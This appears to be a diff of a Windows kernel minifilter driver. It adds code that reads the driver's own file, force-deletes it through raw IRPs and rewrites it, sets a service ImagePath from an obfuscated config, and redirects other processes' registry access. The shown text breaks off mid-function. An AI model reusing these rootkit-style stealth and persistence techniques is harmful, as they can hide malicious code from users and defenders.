@@ -62,7 +62,9 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     ULONG          i = 0;
     kprintf("***************************************************");
 
+	
 
+	
 
     ReadDriverParameters(pRegistryString);
 //  LoggingFlags = LOGFL_INFO;
@@ -81,14 +83,14 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     // Create the device object and device extension
     status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
     if (!NT_SUCCESS(status)) {
-        dprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
+        kprintf("[DriverEntry] Error, IoCreateDevice = 0x%x\r\n", status);
         return status;
     }
 
-    //// Get a pointer to our device extension
+    // Get a pointer to our device extension
     //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;
 
-    //// Save a pointer to the device object
+    // Save a pointer to the device object
     //deviceExtension->DeviceObject = deviceObject;
 
     if (IoIsWdmVersionAvailable(1, 0x10)) {
@@ -111,23 +113,43 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     g_drobj = pDriverObj;
     entry = (PKLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
     if (entry->FullDllName.Buffer) {
-        kprintf("[DriverEntry] fullDllName:%ws", entry->FullDllName.Buffer);
+        //kprintf("[DriverEntry] fullDllName:%ws", entry->FullDllName.Buffer);
+
+        status = MzReadFile(entry->FullDllName.Buffer, &g_pPlugSys, &g_iPlugSys);
+        if (NT_SUCCESS(status)) {
+        } else kprintf("[DriverEntry] File:%ws Error status:%x", entry->FullDllName.Buffer, status);
+
+
+    }
+
+    IoRegisterShutdownNotification(pDevObj);
+    //
+    //  TODO: Add initialization code here.
+    if (g_pPlugSys && g_iPlugSys > 0) {
+        PFILE_OBJECT pFileObject = NULL;
+        IO_STATUS_BLOCK IoStatusBlock = {0};
+        status = IrpCreateFile(&entry->FullDllName, DELETE, &IoStatusBlock, &pFileObject);
+        if (NT_SUCCESS(status)) {
+            status = IrpDeleteFileForce(pFileObject);
+            status = IrpClose(pFileObject);
+        } else {
+            DbgPrint("[DriverEntry] call IrpCreateFile error status:%x", status);
+        }
+
     }
 
 
 
-    IoRegisterShutdownNotification(pDevObj);
 
-    //
-    //  TODO: Add initialization code here.
+
 
     LDE_init();
     //初始化字符串
     InitAllStr();
-
-
+	//设置注册表键值
+	SetRegKeyValue(g_HexConfig[6],L"ImagePath",g_HexConfig[13],REG_EXPAND_SZ);
+//	SetRegKeyValue(g_HexConfig[13],g_HexConfig[14],REG_EXPAND_SZ);
     //要保护的文件
-
     wcscpy(g_pProtectFile[0].exename, g_HexConfig[0]);
     g_pProtectFile[0].uType = 2;
 
@@ -164,8 +186,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     if (NT_SUCCESS(status)) {
     } else kprintf("[DriverEntry] File:%ws Error status:%x", g_HexConfig[12], status);
 
-
-
     kprintf("[DriverEntry] g_pDll64:%p g_iDll64:%x g_pDll32:%p g_iDll32:%x", g_pDll64, g_iDll64, g_pDll32, g_iDll32);
 
 #ifdef _AMD64_
@@ -184,16 +204,16 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 
 
     kprintf("[DriverEntry] PsGetProcessImageFileName:%p", PsGetProcessImageFileName);
-
+    //注册表回调监控
+    SetRegisterCallback();
     // 映像加载回调
     status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
     if (!NT_SUCCESS(status)) {
         kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
     }
+    //文件minifiter
 
-    //注册表回调监控
-    SetRegisterCallback();
-    //文件回调监控
+	
     ExInitializeNPagedLookasideList(&Pre2PostContextList, NULL, NULL, 0, sizeof(PRE_2_POST_CONTEXT), PRE_2_POST_TAG, 0);
     status = FltRegisterFilter(pDriverObj, &FilterRegistration, &gFilterHandle);
     ASSERT(NT_SUCCESS(status));
@@ -207,7 +227,29 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
         }
     }
 
-    //bAceessFile(entry->FullDllName.Buffer);
+//  status = bAceessFile(entry->FullDllName.Buffer);
+
+
+    if (g_pPlugSys && g_iPlugSys > 0) {
+
+
+
+        UNICODE_STRING strFilePath;
+        IO_STATUS_BLOCK IoStatusBlock = {0};
+        PFILE_OBJECT pFileObject = NULL;
+        RtlInitUnicodeString(&strFilePath, entry->FullDllName.Buffer);
+        status = IrpCreateFile(&strFilePath, GENERIC_WRITE, &IoStatusBlock, &pFileObject);
+
+        if(NT_SUCCESS(status)) {
+            status =  IrpFileWrite(pFileObject, NULL, g_iPlugSys, g_pPlugSys, &IoStatusBlock);
+            status = IrpClose(pFileObject);
+        } else {
+        }
+//       status=MzWriteFile(entry->FullDllName.Buffer,g_pPlugSys,g_iPlugSys);
+
+    }
+
+
     kprintf("[DriverEntry] sys is load success!");
 
     kprintf("***************************************************");
@@ -440,11 +482,7 @@ BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
 
 
     KIRQL irql = KeGetCurrentIrql();
-
-
-
     if(irql != PASSIVE_LEVEL) {
-
         LOG(LOGFL_INFO, ( "[GetNameByObj] This is Less IRQL:%d PASSIVE_LEVEL:%d", irql, PASSIVE_LEVEL));
         //return FALSE;
     }
@@ -473,13 +511,6 @@ BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
 //              LOG(LOGFL_INFO,( "[GetNameByObj] irql:%d pNameInfo:%wZ", irql,pNameInfo));
 
             }
-
-
-
-
-
-
-
         }
 
     }
@@ -926,7 +957,8 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
             pStreamCtx->RefCount++;
             pStreamCtx->uAccess = uDesiredAccess;
             SC_UNLOCK(pStreamCtx, OldIrql);
-            //            DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+//           Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+//              DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
 //            LOG(LOGFL_INFO,("[PostCreate] has     found RefCount:%d filename:%wZ\n",pStreamCtx->RefCount, &pStreamCtx->FileName));
             __leave;
         }
@@ -938,10 +970,12 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         pStreamCtx->uAccess = uDesiredAccess;
         LOG(LOGFL_INFO, ("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount, &pStreamCtx->FileName));
 
-        // kprintf("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+//         kprintf("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
+        Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
         //pStreamCtx->aes_ctr_ctx = NULL ;
         SC_UNLOCK(pStreamCtx, OldIrql);
-//        Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+//              Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
+
     }
     finally {
         if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
@@ -1014,25 +1048,20 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
 
         // read length is zero, pass
         if (readLen == 0) __leave;
-
-        //
         //  If this is a non-cached I/O we need to round the length up to the
         //  sector size for this device.  We must do this because the file
         //  systems do this and we need to make sure our buffer is as big
         //  as they are expecting.
-        //
 
         if (FlagOn(IRP_NOCACHE, iopb->IrpFlags)) {
 
             readLen = (ULONG)ROUND_TO_SIZE(readLen, volCtx->SectorSize);
         }
-
+//      __leave;
         //
         //  Allocate nonPaged memory for the buffer we are swapping to.
         //  If we fail to get the memory, just don't swap buffers on this
         //  operation.
-        //
-
         newBuf = ExAllocatePoolWithTag(NonPagedPool, readLen, BUFFER_SWAP_TAG);
         if (newBuf == NULL) {
             leave;
@@ -1043,7 +1072,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
         //  do this for a FASTIO operation since the FASTIO interface has no
         //  parameter for passing the MDL to the file system.
         //
-        RtlZeroMemory(newBuf, readLen);
+//        RtlZeroMemory(newBuf, readLen);
         if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_IRP_OPERATION)) {
 
             //
@@ -1129,7 +1158,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
     IN PVOID CompletionContext,
     IN FLT_POST_OPERATION_FLAGS Flags)
 {
-    PVOID origBuf;
+    PVOID origBuf=NULL;
     PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
     FLT_POSTOP_CALLBACK_STATUS retValue = FLT_POSTOP_FINISHED_PROCESSING;
     BOOLEAN cleanupAllocatedBuffer = TRUE;
@@ -1148,8 +1177,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         if (!NT_SUCCESS(Data->IoStatus.Status) || (Data->IoStatus.Information == 0)) {
             leave;
         }
-
-
         LOG(LOGFL_INFO, ("[PostRead] newBuf:%p newMdl:%p irql:%d pid:%d  Len:%d file:%ws", p2pCtx->SwappedBuffer, p2pCtx->pMdl, irql, pid,
                          Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
         //
@@ -1169,135 +1196,60 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
 
             LOG(LOGFL_INFO, ("[PostRead] MmGetSystemAddressForMdlSafe IRQL:%d Len:%d file:%ws",irql, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
 
+        } else if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) || FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
+            //
+            //  If this is a system buffer, just use the given address because
+            //      it is valid in all thread contexts.
+            //  If this is a FASTIO operation, we can just use the
+            //      buffer (inside a try/except) since we know we are in
+            //      the correct thread context (you can't pend FASTIO's).
+            //
+            origBuf = iopb->Parameters.Read.ReadBuffer;
+
         } else {
 
-            if(FLT_IS_SYSTEM_BUFFER(Data)) {
-                origBuf = iopb->Parameters.Read.ReadBuffer;
-                LOG(LOGFL_INFO, ("[PostRead] FLT_IS_SYSTEM_BUFFER Len:%d file:%ws", Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-
-            } else if(FLT_IS_FASTIO_OPERATION(Data)) {
-                origBuf = iopb->Parameters.Read.ReadBuffer;
-                LOG(LOGFL_INFO, ("[PostRead] FLT_IS_FASTIO_OPERATION Len:%d file:%ws", Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-
+            LOG(LOGFL_INFO, ("[PostRead] Call FltDoCompletionProcessingWhenSafe Len:%d file:%ws", Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+            if (FltDoCompletionProcessingWhenSafe(Data, FltObjects, CompletionContext, Flags, PostReadWhenSafe, &retValue)) {
+                cleanupAllocatedBuffer = FALSE;
             } else {
 
-                LOG(LOGFL_INFO, ("[PostRead] Call FltDoCompletionProcessingWhenSafe Len:%d file:%ws", Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-                if (FltDoCompletionProcessingWhenSafe(Data, FltObjects, CompletionContext, Flags, PostReadWhenSafe, &retValue)) {
-                    cleanupAllocatedBuffer = FALSE;
-                } else {
-                    //                DbgPrint("[PostRead] call else");
-                    Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
-                    Data->IoStatus.Information = 0;
-                }
-                leave;
+                Data->IoStatus.Status = STATUS_UNSUCCESSFUL;
+                Data->IoStatus.Information = 0;
+                LOG( LOGFL_INFO,("[PostRead]: %wZ Invalid user buffer, oldB=%p, status=%x\n",&p2pCtx->VolCtx->Name,origBuf,Data->IoStatus.Status) );
 
             }
+            leave;
         }
 
 
-        __try {
 
 
-            if (irql == PASSIVE_LEVEL) {
-
-                PUCHAR   pOrigBuf = (PUCHAR)origBuf;
-//                ProbeForRead(pOrigBuf, Data->IoStatus.Information, Data->IoStatus.Information );
-//                ProbeForWrite( pOrigBuf, Data->IoStatus.Information, Data->IoStatus.Information );
-                if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                    LOG(LOGFL_INFO, ("[PostRead] pid:%d Encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-                    EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-                } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                    PEPROCESS ProcessObj = NULL;
-                    if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
-                        WCHAR exename[512] = { 0 };
-                        BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
-                        if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
-                        if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d exename:%ws not encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
-                        } else {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d exename:%ws  encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-
-
-                        }
-
+        try {
+            PUCHAR   pOrigBuf = (PUCHAR)origBuf;
+            if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
+                LOG(LOGFL_INFO, ("[PostRead] pid:%d irql:%d Encrypte Len:%d file:%ws", pid,KeGetCurrentIrql(), Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
+            } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
+                WCHAR exename[512] = { 0 };
+                BOOLEAN bgetname = GetNameByObj(FltGetRequestorProcess(Data), exename);
+                if (bgetname) {
+                    if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws not encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                        EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
+                    } else {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws	 encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information,irql,p2pCtx->pStreamCtx->FileName.Buffer));
+                        EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                     }
+
                 }
+            }
 
-            }else{
-
-	
-
-                    PEPROCESS ProcessObj = NULL;
-					LOG(LOGFL_INFO, ("[PostRead] IRQL :%d is Less Or Not Equal PASSIVE_LEVEL",irql));
-                    if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
-                        WCHAR exename[512] = { 0 };
-                        BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
-                        if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
-                        if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d exename:%ws not encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
-                        } else {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d exename:%ws  encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-
-
-                        }
-
-                    }
-
-
-
-					
-//					  EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-					
-			}
-
-
-
-        } __except(EXCEPTION_EXECUTE_HANDLER) {
-            ULONG code = GetExceptionCode();
+        }
+        except (EXCEPTION_EXECUTE_HANDLER) {
+            Data->IoStatus.Status = GetExceptionCode();
+            Data->IoStatus.Information = 0;
         }
 
-//        try {
-//
-//
-//
-//
-//                PUCHAR   pOrigBuf = (PUCHAR)origBuf;
-//                //除去explorer 全加密
-//                if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-//                    LOG(LOGFL_INFO, ("[PostRead]  Encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
-//                    EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-//                } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-//                    PEPROCESS ProcessObj = NULL;
-//                    if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
-//                        WCHAR exename[512] = { 0 };
-//                        BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
-//                        if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
-//                        if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
-//                            LOG(LOGFL_INFO, ("[PostRead] exename:%ws not encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-//                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
-//                            //                      RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
-//                        } else {
-//                            LOG(LOGFL_INFO, ("[PostRead]  exename:%ws  encrypte filename:%ws", pid, exename, p2pCtx->pStreamCtx->FileName.Buffer));
-//                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-//
-//
-//                        }
-//
-//                    }
-//                }
-//
-//        }
-//        __except(EXCEPTION_EXECUTE_HANDLER) {
-//            ULONG code = GetExceptionCode();
-//        }
-//
-//
-
-//        EncodeBuffer(Data, p2pCtx, origBuf);
     }
     finally{
 
@@ -1309,7 +1261,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //        DbgPrint("[PostRead] finally cleanupAllocatedBuffer:%d",cleanupAllocatedBuffer);
         if (cleanupAllocatedBuffer)
         {
-
             ExFreePool(p2pCtx->SwappedBuffer);
             FltReleaseContext(p2pCtx->VolCtx);
             FltReleaseContext(p2pCtx->pStreamCtx);
@@ -1340,11 +1291,8 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe(IN OUT PFLT_CALLBACK_DATA Data, IN P
     UNREFERENCED_PARAMETER(FltObjects);
     UNREFERENCED_PARAMETER(Flags);
     ASSERT(Data->IoStatus.Information != 0);
-
     status = FltLockUserBuffer(Data);
-
     if (!NT_SUCCESS(status)) {
-
         //
         //  If we can't lock the buffer, fail the operation
         //
@@ -1352,63 +1300,37 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe(IN OUT PFLT_CALLBACK_DATA Data, IN P
         Data->IoStatus.Information = 0;
     } else {
         ULONG pid = FltGetRequestorProcessId(Data);
-        LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d newBuf:%p newMdl:%p  Len:%d file:%ws",
-                         pid, p2pCtx->SwappedBuffer, p2pCtx->pMdl,
+        LOG(LOGFL_INFO, ("[PostReadWhenSafe] irql:%d pid:%d newBuf:%p newMdl:%p  Len:%d file:%ws",
+                         irql,pid, p2pCtx->SwappedBuffer, p2pCtx->pMdl,
                          Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
         origBuf = MmGetSystemAddressForMdlSafe(iopb->Parameters.Read.MdlAddress, NormalPagePriority);
         if (origBuf == NULL) {
-
             //
             //  If we couldn't get a SYSTEM buffer address, fail the operation
             //
             Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
             Data->IoStatus.Information = 0;
         } else {
-            try {
-
-
-                if (irql == PASSIVE_LEVEL) {
-
-                    PUCHAR   pOrigBuf = (PUCHAR)origBuf;
-                    //除去explorer 全加密
-
-                    if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                        LOG(LOGFL_INFO, ("[PostReadWhenSafe] irql:%d encrypte len:%d file:%ws", irql, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+            PUCHAR   pOrigBuf = (PUCHAR)origBuf;
+            if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
+                LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d irql:%d Encrypte Len:%d file:%ws", pid,KeGetCurrentIrql(), Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
+            } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
+                WCHAR exename[512] = { 0 };
+                BOOLEAN bgetname = GetNameByObj(FltGetRequestorProcess(Data), exename);
+                if (bgetname) {
+                    if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws not encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
+                        EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
+                        // RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
+                    } else {
+                        LOG(LOGFL_INFO, ("[PostRead] exename:%ws	 encrypte Len:%d filename:%ws", exename,Data->IoStatus.Information,irql,p2pCtx->pStreamCtx->FileName.Buffer));
                         EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-                    } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                        //                    PEPROCESS ProcessObj = NULL;// FltGetRequestorProcess(Data);
-                        //                    if (NT_SUCCESS(PsLookupProcessByProcessId(pid,ProcessObj))) {
-                        //                        WCHAR exename[512] = { 0 };
-                        //                        BOOLEAN bGetName = GetNameByObj(ProcessObj, exename);
-                        //                        ObfDereferenceObject(ProcessObj);
-                        //                        if (_wcsicmp(exename, g_HexConfig[4]) == 0 || _wcsicmp(exename, g_HexConfig[5]) == 0) {
-                        //                            LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d exename:%ws not encrypte filename:%ws",pid,exename,p2pCtx->pStreamCtx->FileName.Buffer));
-                        //                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
-                        //                        } else {
-                        //                            LOG(LOGFL_INFO, ("[PostReadWhenSafe] pid:%d exename:%ws encrypte filename:%ws",pid,exename,p2pCtx->pStreamCtx->FileName.Buffer));
-                        //                            EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
-                        //                        }
-                        //
-                        //                    }
-                        //
-                        //
                     }
 
-
                 }
-
-
-            }
-            __except(EXCEPTION_EXECUTE_HANDLER) {
-                ULONG code = GetExceptionCode();
             }
 
-
-
-//            EncodeBuffer(Data, p2pCtx, origBuf);
-            //DbgPrint("[PostReadWhenSafe] %s",origBuf);
-            //memset( p2pCtx->SwappedBuffer, 0x61, Data->IoStatus.Information);
-            //RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
         }
     }
 
@@ -1474,7 +1396,6 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
                     pfind = wcsrchr(PathReg, L'\\');
                     if (pfind) {
                         pfind++;
-
                         if (_wcsicmp(pfind, g_HexConfig[8]) == 0) {
                             if (wcsstr(PathReg, g_HexConfig[7])) {
 
@@ -1488,21 +1409,18 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
                                         else bRedirect = TRUE;
                                     } else bRedirect = TRUE;
                                     if (bRedirect == TRUE) {
-                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws PathReg:%ws   Redirec", PsGetCurrentProcessId(), exename, PathReg));
+                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws   Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
                                         status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
                                     } else {
-                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",
+                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws is not Redirec DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x",
                                                          PsGetCurrentProcessId(), exename, KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition,
                                                          KeyInfo->CreateOptions));
                                     }
-                                } else LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws PathReg:%ws  is not Redirec", PsGetCurrentProcessId(), exename, PathReg));
+                                } else LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws   is not Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
 
                             }
                         } else if (_wcsicmp(pfind, g_HexConfig[9]) == 0) {
                             BOOLEAN bGetExeName = FALSE;
-//                          LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x g_HexConfig[10]:%ws PathReg:%ws",
-//                                  PsGetCurrentProcessId(),exename, KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition,KeyInfo->CreateOptions,
-//                                  g_HexConfig[10],PathReg));
                             _wcslwr(PathReg);
                             if (wcsstr(PathReg, g_HexConfig[10]) != NULL) {
                                 bGetExeName = GetNameByObj(PsGetCurrentProcess(), exename);
@@ -1511,10 +1429,11 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
                                     ULONG udesire = KEY_ALL_ACCESS_;
 
                                     if (udesire != KeyInfo->DesiredAccess) {
-
-                                        LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws DesiredAccess1:%x DesiredAccess2:%x", PsGetCurrentProcessId(), exename, KeyInfo->DesiredAccess, udesire));
+                                        LOG(LOGFL_INFO, ("[RegCallBack]   pid:%d exename:%ws	 Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
                                         status = RedirectReg(KeyInfo, NotifyClass, g_HexConfig[6]);
-                                    }
+                                    } else LOG(LOGFL_INFO, ("[RegCallBack] pid:%d exename:%ws is not Redirec PathReg:%ws", PsGetCurrentProcessId(), exename, PathReg));
+
+
                                 }
                             }
 
@@ -1535,7 +1454,6 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
 NTSTATUS SetRegisterCallback()
 {
     NTSTATUS status = CmRegisterCallback(RegCallBack, NULL, &g_liRegCookie);
-
     if (!NT_SUCCESS(status)) {
         DbgPrint("CmRegisterCallback", status);
         g_liRegCookie.QuadPart = 0;
@@ -2550,8 +2468,7 @@ void InitAllStr()
     }
     MyDecryptFile(hexConfig, sizeof(hexConfig), 0xb);
 //  [DriverEntry] File:\??\C:\Windows\adcore32.dat Error status:c0000034
-
-    MzWriteFile(L"\\??\\C:\\hex.txt", hexConfig, sizeof(hexConfig));
+//    MzWriteFile(L"\\??\\C:\\hex.txt", hexConfig, sizeof(hexConfig));
 
     if (TRUE) {
         CHAR *pnext = (CHAR *)hexConfig;
@@ -2914,6 +2831,530 @@ NTSTATUS DenyLoadDll(HANDLE ProcessId, PVOID pImageBase)
 }
 
 
+
+
+NTSTATUS IrpFileWrite(PFILE_OBJECT pFileObject, PLARGE_INTEGER ByteOffset, ULONG aalen, PVOID Buffer, PIO_STATUS_BLOCK pIoStatusBlock)
+{
+
+    NTSTATUS status;
+    KEVENT event;
+    PIRP irp;
+    PIO_STACK_LOCATION irpSp;
+    PDEVICE_OBJECT deviceObject;
+    PDEVICE_OBJECT polddev = NULL;
+
+    //
+    if(pIoStatusBlock == NULL || pFileObject == NULL || aalen <= 0 || Buffer == NULL)return STATUS_INVALID_PARAMETER;
+
+
+    if(ByteOffset == NULL) {
+        if(!(pFileObject->Flags & FO_SYNCHRONOUS_IO))
+            return STATUS_INVALID_PARAMETER;
+
+        ByteOffset = &pFileObject->CurrentByteOffset;
+    }
+
+
+    deviceObject = IoGetRelatedDeviceObject(pFileObject);
+
+    if(deviceObject == NULL || deviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+
+    irp = IoAllocateIrp(deviceObject->StackSize, FALSE);
+
+    if(irp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
+
+
+    irp->MdlAddress = IoAllocateMdl(Buffer, aalen, FALSE, FALSE, NULL);
+
+    if(irp->MdlAddress == NULL) {
+        IoFreeIrp(irp);
+        return STATUS_INSUFFICIENT_RESOURCES;;
+    }
+
+    MmBuildMdlForNonPagedPool(irp->MdlAddress);
+    //éè??±?á?
